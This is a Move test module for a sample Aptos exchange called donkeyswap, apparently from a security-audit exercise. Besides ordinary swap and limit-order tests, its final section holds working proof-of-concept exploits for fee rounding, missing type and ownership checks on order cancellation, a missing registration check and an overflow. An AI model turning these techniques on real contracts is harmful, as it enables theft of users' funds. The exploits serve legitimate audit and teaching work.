#[test_only]
module donkeyswap::test {
    use donkeyswap::market::{Self, USDC, DONK};

    use aptos_framework::type_info;
    use aptos_framework::coin;
    use std::string;
    use std::signer::{address_of};
    use aptos_framework::account;

    struct CoinCapability<phantom CoinType> has key, store {
        burn_cap: coin::BurnCapability<CoinType>,
        freeze_cap: coin::FreezeCapability<CoinType>,
        mint_cap: coin::MintCapability<CoinType>,
    }

    struct ZEL {} // zellic coin
    struct HUGE {} // huge decimals coin

    const ERR_UNEXPECTED_BALANCE: u64 = 101;
    const ERR_UNEXPECTED_PROTOCOL_FEES: u64 = 102;
    const ERR_UNEXPECTED_STATUS: u64 = 201;
    const ERR_UNEXPECTED_ACCOUNT: u64 = 301;


    //////// SECTION: HELPERS


    fun setup(admin: &signer, user: &signer) acquires CoinCapability {
        // setup coins

        let (usdc_burn_capability, usdc_freeze_capability, usdc_mint_capability) = coin::initialize<USDC>(
            admin,
            string::utf8(b"USDC"),
            string::utf8(b"USDC"),
            4,
            true
        );
        let (donk_burn_capability, donk_freeze_capability, donk_mint_capability) = coin::initialize<DONK>(
            admin,
            string::utf8(b"DONK"),
            string::utf8(b"DONK"),
            9,
            true
        );
        let (zel_burn_capability, zel_freeze_capability, zel_mint_capability) = coin::initialize<ZEL>(
            admin,
            string::utf8(b"ZEL"),
            string::utf8(b"ZEL"),
            6,
            true
        );
        let (huge_burn_capability, huge_freeze_capability, huge_mint_capability) = coin::initialize<HUGE>(
            admin,
            string::utf8(b"HUGE"),
            string::utf8(b"HUGE"),
            10,
            true
        );

        account::create_account_for_test(address_of(admin));
        account::create_account_for_test(address_of(user));

        coin::register<USDC>(admin);
        coin::register<DONK>(admin);
        coin::register<ZEL>(admin);
        coin::register<HUGE>(admin);
        coin::register<USDC>(user);
        coin::register<DONK>(user);
        coin::register<ZEL>(user);
        coin::register<HUGE>(user);

        move_to(admin, CoinCapability<USDC> {
            burn_cap: usdc_burn_capability,
            freeze_cap: usdc_freeze_capability,
            mint_cap: usdc_mint_capability
        });
        move_to(admin, CoinCapability<DONK> {
            burn_cap: donk_burn_capability,
            freeze_cap: donk_freeze_capability,
            mint_cap: donk_mint_capability
        });
        move_to(admin, CoinCapability<ZEL> {
            burn_cap: zel_burn_capability,
            freeze_cap: zel_freeze_capability,
            mint_cap: zel_mint_capability
        });
        move_to(admin, CoinCapability<HUGE> {
            burn_cap: huge_burn_capability,
            freeze_cap: huge_freeze_capability,
            mint_cap: huge_mint_capability
        });

        // setup market stuff

        market::admin_setup(admin);
        market::admin_create_coinstore<ZEL>(admin);
        market::admin_create_coinstore<HUGE>(admin);

        // add DONK liquidity

        let init_donk = 18446744073709551615; // max u64
        mint<DONK>(init_donk, address_of(admin));
        market::admin_deposit_donk(admin, init_donk);

        assert!(market::get_protocol_fees<USDC>() == 0, ERR_UNEXPECTED_PROTOCOL_FEES);
        assert!(market::get_protocol_fees<ZEL>() == 0, ERR_UNEXPECTED_PROTOCOL_FEES);
        assert!(market::get_protocol_fees<HUGE>() == 0, ERR_UNEXPECTED_PROTOCOL_FEES);
    }


    fun setup_with_liquidity(admin: &signer, user: &signer) acquires CoinCapability {
        setup(admin, user);

        // add liquidity 

        let init_usdc = 1000_0000; // $1000 USDC
        let init_zel = 100_000000; // 100 ZEL

        mint<USDC>(init_usdc, address_of(admin));
        mint<ZEL>(init_zel, address_of(admin));

        market::add_liquidity<USDC>(admin, init_usdc);
        market::add_liquidity<ZEL>(admin, init_zel);

        assert!(market::get_protocol_fees<USDC>() == 0, ERR_UNEXPECTED_PROTOCOL_FEES);
        assert!(market::get_protocol_fees<ZEL>() == 0, ERR_UNEXPECTED_PROTOCOL_FEES);
    }


    fun setup_with_limit_swap(admin: &signer, user: &signer, min_quote: u64): (u64, u64) acquires CoinCapability {
        setup_with_liquidity(admin, user);

        let my_usdc = 10_0000; // $10 USDC
        mint<USDC>(my_usdc, address_of(user));

        assert!(coin::balance<USDC>(address_of(user)) == my_usdc, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);

        let order_id = market::limit_swap<USDC, ZEL>(user, my_usdc, min_quote);

        // usdc should be withdrawn, regardless of whether the order is fulfilled yet
        assert!(coin::balance<USDC>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);

        return (my_usdc, order_id)
    }


    fun mint<CoinType>(amount: u64, to: address) acquires CoinCapability {
        let coin_address = type_info::account_address(&type_info::type_of<CoinType>());
        let coin_cap = borrow_global<CoinCapability<CoinType>>(coin_address);
        let coin = coin::mint<CoinType>(amount, &coin_cap.mint_cap);
        coin::deposit<CoinType>(to, coin);
    }


    //////// SECTION: TESTS


    #[test(admin=@donkeyswap, user=@0x2222)]
    #[expected_failure(abort_code=market::ERR_ORDER_WRONG_COIN_TYPE)]
    fun WHEN_no_operations_with_donk(admin: &signer, user: &signer) acquires CoinCapability {
        setup(admin, user);
        market::add_liquidity<DONK>(admin, 1000000);
    }


    #[test(admin=@donkeyswap, user=@0x2222)]
    #[expected_failure(abort_code=market::ERR_ORDER_DUPLICATE_COIN_TYPE)]
    fun WHEN_no_operations_with_duplicate_coin_types(admin: &signer, user: &signer) acquires CoinCapability {
        setup(admin, user);
        market::swap<DONK, DONK>(admin, 1000000);
    }


    #[test(admin=@donkeyswap, user=@0x2222)]
    #[expected_failure(abort_code=market::ERR_LIQUIDITY_INSUFFICIENT)]
    fun WHEN_test_swap_with_insufficient_liquidity(admin: &signer, user: &signer) acquires CoinCapability {
        setup(admin, user);

        let my_usdc = 10_0000; // $10 USDC
        mint<USDC>(my_usdc, address_of(user));

        assert!(coin::balance<USDC>(address_of(user)) == my_usdc, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);

        market::swap<USDC, ZEL>(user, my_usdc);
        abort(ERR_UNEXPECTED_STATUS) // should not get here
    }


    #[test(admin=@donkeyswap, user=@0x2222)]
    fun WHEN_test_successful_swap(admin: &signer, user: &signer) acquires CoinCapability {
        setup_with_liquidity(admin, user);

        let my_usdc = 10_0000; // $10 USDC
        mint<USDC>(my_usdc, address_of(user));

        assert!(coin::balance<USDC>(address_of(user)) == my_usdc, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);

        let output = market::swap<USDC, ZEL>(user, my_usdc);

        assert!(coin::balance<USDC>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) == output, ERR_UNEXPECTED_BALANCE);
        assert!(output > 0, ERR_UNEXPECTED_BALANCE);

        assert!(market::get_protocol_fees<USDC>() == 0, ERR_UNEXPECTED_PROTOCOL_FEES);
        assert!(market::get_protocol_fees<ZEL>() != 0, ERR_UNEXPECTED_PROTOCOL_FEES);

        //debug::print(&coin::balance<USDC>(address_of(user)));
        //debug::print(&coin::balance<ZEL>(address_of(user)));
    }


    #[test(admin=@donkeyswap, user=@0x2222)]
    fun WHEN_test_successful_limit_swap_fulfills(admin: &signer, user: &signer) acquires CoinCapability {
        let (_my_usdc, order_id) = setup_with_limit_swap(admin, user, 0);
        let status = market::fulfill_order<ZEL>(order_id);
        assert!(status == 0, ERR_UNEXPECTED_STATUS);

        assert!(coin::balance<USDC>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) > 0, ERR_UNEXPECTED_BALANCE);

        assert!(market::get_protocol_fees<USDC>() == 0, ERR_UNEXPECTED_PROTOCOL_FEES);
        assert!(market::get_protocol_fees<ZEL>() != 0, ERR_UNEXPECTED_PROTOCOL_FEES);
    }


    #[test(admin=@donkeyswap, user=@0x2222)]
    #[expected_failure(abort_code=market::ERR_ORDER_NOT_FOUND)]
    fun WHEN_test_successful_limit_swap_cant_fulfill_twice(admin: &signer, user: &signer) acquires CoinCapability {
        let (_my_usdc, order_id) = setup_with_limit_swap(admin, user, 0);
        market::fulfill_order<ZEL>(order_id);

        assert!(coin::balance<USDC>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) > 0, ERR_UNEXPECTED_BALANCE);

        market::fulfill_order<ZEL>(order_id);
    }


    #[test(admin=@donkeyswap, user=@0x2222)]
    fun WHEN_test_successful_limit_swap_not_fulfills(admin: &signer, user: &signer) acquires CoinCapability {
        let (_my_usdc, order_id) = setup_with_limit_swap(admin, user, 1000000000000000);
        assert!(coin::balance<ZEL>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);

        market::fulfill_order<ZEL>(order_id);

        assert!(coin::balance<USDC>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);

        assert!(market::get_protocol_fees<USDC>() == 0, ERR_UNEXPECTED_PROTOCOL_FEES);
        assert!(market::get_protocol_fees<ZEL>() == 0, ERR_UNEXPECTED_PROTOCOL_FEES);
    }


    #[test(admin=@donkeyswap, user=@0x2222)]
    fun WHEN_test_successful_limit_swap_cancels(admin: &signer, user: &signer) acquires CoinCapability {
        let (my_usdc, order_id) = setup_with_limit_swap(admin, user, 1000000000000000);
        assert!(coin::balance<ZEL>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);

        market::cancel_order<USDC>(user, order_id);

        assert!(coin::balance<USDC>(address_of(user)) == my_usdc, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);

        assert!(market::get_protocol_fees<USDC>() == 0, ERR_UNEXPECTED_PROTOCOL_FEES);
        assert!(market::get_protocol_fees<ZEL>() == 0, ERR_UNEXPECTED_PROTOCOL_FEES);
    }


    //////// SECTION: VULNERABILITY POCS


    #[test(admin=@donkeyswap, user=@0x2222)]
    fun WHEN_exploit_fees_rounding_down(admin: &signer, user: &signer) acquires CoinCapability {
        setup_with_liquidity(admin, user);

        let max_exploit_amount = (10000 / market::get_protocol_fees_bps()) - 1;
        assert!(market::calculate_protocol_fees(max_exploit_amount) == 0, ERR_UNEXPECTED_PROTOCOL_FEES);

        let my_usdc = max_exploit_amount;
        mint<USDC>(my_usdc, address_of(user));

        assert!(coin::balance<USDC>(address_of(user)) == my_usdc, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);

        let output = market::swap<USDC, ZEL>(user, my_usdc);

        assert!(coin::balance<USDC>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) == output, ERR_UNEXPECTED_BALANCE);
        assert!(output > 0, ERR_UNEXPECTED_BALANCE);

        assert!(market::get_protocol_fees<USDC>() == 0, ERR_UNEXPECTED_PROTOCOL_FEES);
        assert!(market::get_protocol_fees<ZEL>() == 0, ERR_UNEXPECTED_PROTOCOL_FEES); // no fees collected
    }


    #[test(admin=@donkeyswap, user=@0x2222)]
    fun WHEN_exploit_lack_of_type_checking(admin: &signer, user: &signer) acquires CoinCapability {
        let (my_usdc, order_id) = setup_with_limit_swap(admin, user, 1000000000000000);

        // let's say the admin deposits some ZEL

        mint<ZEL>(my_usdc, address_of(admin));
        let _admin_order_id = market::limit_swap<ZEL, USDC>(admin, my_usdc, 1000000000000000);

        // now, let's try stealing from the admin

        assert!(coin::balance<USDC>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);

        market::cancel_order<ZEL>(user, order_id); // ZEL is not the right coin type!

        assert!(coin::balance<USDC>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) == my_usdc, ERR_UNEXPECTED_BALANCE); // received ZEL?
    }


    #[test(admin=@donkeyswap, user=@0x2222)]
    fun WHEN_exploit_improper_access_control(admin: &signer, user: &signer) acquires CoinCapability {
        setup_with_liquidity(admin, user);

        // let's say the admin deposits some USDC

        let my_usdc = 1000000000000000;
        mint<USDC>(my_usdc, address_of(admin));
        let order_id = market::limit_swap<USDC, ZEL>(admin, my_usdc, 1000000000000000);

        // now, let's try stealing USDC from the admin

        assert!(coin::balance<USDC>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);

        market::cancel_order<USDC>(user, order_id); // order owned by admin, but signer is user!

        assert!(coin::balance<USDC>(address_of(user)) == my_usdc, ERR_UNEXPECTED_BALANCE);
        assert!(coin::balance<ZEL>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE); // received ZEL?
    }


    #[test(admin=@donkeyswap, user=@0x2222, attacker=@0x3333)]
    #[expected_failure(abort_code=393221, location=coin)] // ECOIN_STORE_NOT_PUBLISHED
    fun WHEN_exploit_lack_of_account_registered_check(admin: &signer, user: &signer, attacker: &signer) acquires CoinCapability {
        account::create_account_for_test(address_of(attacker));
        setup(admin, user);
        assert!(!coin::is_account_registered<ZEL>(address_of(attacker)), ERR_UNEXPECTED_ACCOUNT);

        // create limit order from attacker's account
        let my_usdc = 10_0000; // $10 USDC
        mint<USDC>(my_usdc, address_of(attacker));
        market::limit_swap<USDC, ZEL>(user, my_usdc, 0);

        // try to add liquidity from user's account, which tries to fulfill the order
        mint<USDC>(my_usdc, address_of(user));
        market::add_liquidity<USDC>(user, my_usdc); // this should abort
    }


    #[test(admin=@donkeyswap, user=@0x2222)]
    #[expected_failure(arithmetic_error, location=market)]
    fun WHEN_exploit_overflow_revert(admin: &signer, user: &signer) acquires CoinCapability {
        setup_with_liquidity(admin, user);

        // add extra DONK liquidity
        let admin_donk = 1000000000000000;
        mint<DONK>(admin_donk, address_of(admin));
        market::admin_deposit_donk(admin, admin_donk);

        // place a reasonable order size for HUGE
        let user_huge = 1000000000000000;
        mint<HUGE>(user_huge, address_of(user));
        market::limit_swap<HUGE, ZEL>(user, user_huge, 0);

        // inadvertently fulfill limit order
        let admin_zel = 10000;
        mint<ZEL>(admin_zel, address_of(admin));
        market::add_liquidity<ZEL>(admin, admin_zel);
    }
}
